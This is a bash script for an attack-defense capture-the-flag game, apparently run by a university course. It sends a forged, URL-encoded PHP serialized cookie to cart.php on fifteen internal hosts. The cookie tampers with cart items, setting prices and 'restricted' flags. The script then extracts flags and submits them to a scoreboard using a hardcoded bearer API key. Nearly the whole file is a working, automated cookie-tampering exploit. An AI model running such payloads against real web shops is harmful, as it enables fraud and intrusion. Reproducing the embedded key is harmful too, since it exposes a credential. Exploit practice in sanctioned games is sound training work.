#!/bin/bash

ips=(
    "10.219.255.2" "10.219.255.6" "10.219.255.14" "10.219.255.18"
    "10.219.255.22" "10.219.255.26" "10.219.255.30" "10.219.255.34"
    "10.219.255.38" "10.219.255.42" "10.219.255.46" "10.219.255.50"
    "10.219.255.54" "10.219.255.58" "10.219.255.62"
)

cookie='STATE=a%3A1%3A%7Bs%3A4%3A%22cart%22%3Ba%3A2%3A%7Bi%3A0%3Ba%3A4%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22FLAG%22%3Bs%3A5%3A%22price%22%3Bi%3A9%3Bs%3A10%3A%22restricted%22%3Bb%3A0%3Bs%3A4%3A%22desc%22%3Bs%3A35%3A%22This%20is%20a%20FLAG.%20You%20can%20capture%20it.%22%3B%7Di%3A1%3Ba%3A4%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22FLAG%22%3Bs%3A5%3A%22price%22%3Bi%3A0%3Bs%3A10%3A%22restricted%22%3Bb%3A0%3Bs%3A4%3A%22desc%22%3Bs%3A24%3A%22Second%20FLAG%20for%20testing.%22%3B%7D%7D%7D'

submit_url="https://ctf.hackintro25.di.uoa.gr/submit"
api_key="f99e197afa7122298b9b948accf205313ee28954a2af6a98710317f8dc80ea52"

for ip in "${ips[@]}"; do
    echo "[+] Trying http://$ip:8005/cart.php"
    
    response=$(curl -s --connect-timeout 15 --max-time 30 -b "$cookie" "http://$ip:8005/cart.php")
    flag=$(echo "$response" | grep -oE "FLAG\s*-\s*[A-Za-z0-9]+" | head -n 1)

    if [[ -n "$flag" ]]; then
        echo "[!] Flag found: $flag"
        submit_response=$(curl -s -w "%{http_code}" -o /tmp/submit_out \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer $api_key" \
            -d "{\"flag\": \"$flag\"}" \
            "$submit_url")

        if [[ "$submit_response" == "200" ]]; then
            echo "[✓] Flag submitted successfully!"
        else
            echo "[!] Submission failed: HTTP $submit_response"
            cat /tmp/submit_out
        fi
    else
        echo "[-] No flag found."
    fi
done